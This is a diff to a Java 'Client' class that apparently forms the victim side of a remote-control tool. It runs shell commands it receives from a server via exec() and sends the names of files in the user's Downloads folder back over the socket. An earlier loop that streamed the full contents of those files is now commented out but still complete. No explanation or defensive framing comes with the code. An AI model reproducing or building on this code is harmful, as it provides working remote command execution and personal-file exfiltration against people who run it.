@@ -46,12 +46,13 @@ public class Client {
                     System.out.println(comm);
                     exec(comm.replace("CMD ", ""));
                 }
-                if (comm.contains("FILES")){
+                if (comm.contains("FILELIST")){
                     sendFileList();
                 }
                 if (comm.equals("forciblyclose")) {
                     Writer writer = new OutputStreamWriter(out);
                     writer.write("forciblyclose");
+                    System.exit(0);
                 }
             }
         } catch (IOException e) {
@@ -65,6 +66,12 @@ public class Client {
 
     /* Sends a message to the Server. */
     private void communicate(String msg) throws IOException {
+        PrintWriter writer = new PrintWriter(out);
+        writer.write(msg);
+        writer.flush();
+    }
+
+    private void communicate(int msg) throws IOException {
         PrintWriter writer = new PrintWriter(out);
         writer.write(msg);
         writer.flush();
@@ -112,31 +119,39 @@ public class Client {
     }
 
     private void sendFileList() throws IOException {
-        String directory = System.getProperty("user.home")+"/Downloads/";
+        String directory = System.getProperty("user.home") + "/Downloads/";
         File[] files = new File(directory).listFiles();
-        communicate("FILES");
         BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
         DataOutputStream dos = new DataOutputStream(bos);
-
+        communicate("FILELIST");
         dos.writeInt(files.length);
-
-        for(File file : files){
-            Long length = file.length();
-            dos.writeLong(length);
-
+        for (File file : files) {
             String name = file.getName();
             dos.writeUTF(name);
-
-            FileInputStream fis = new FileInputStream(file);
-            BufferedInputStream bis = new BufferedInputStream(fis);
-
-            int fbyte = 0;
-            while((fbyte = bis.read()) != -1) {
-                bos.write(fbyte);
-
-            }
-            bis.close();
         }
         dos.close();
+//        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
+//        DataOutputStream dos = new DataOutputStream(bos);
+//
+//        dos.writeInt(files.length);
+//
+//        for(File file : files){
+//            Long length = file.length();
+//            dos.writeLong(length);
+//
+//            String name = file.getName();
+//            dos.writeUTF(name);
+//
+//            FileInputStream fis = new FileInputStream(file);
+//            BufferedInputStream bis = new BufferedInputStream(fis);
+//
+//            int fbyte = 0;
+//            while((fbyte = bis.read()) != -1) {
+//                bos.write(fbyte);
+//
+//            }
+//            bis.close();
+//        }
+//        dos.close();
     }
 }
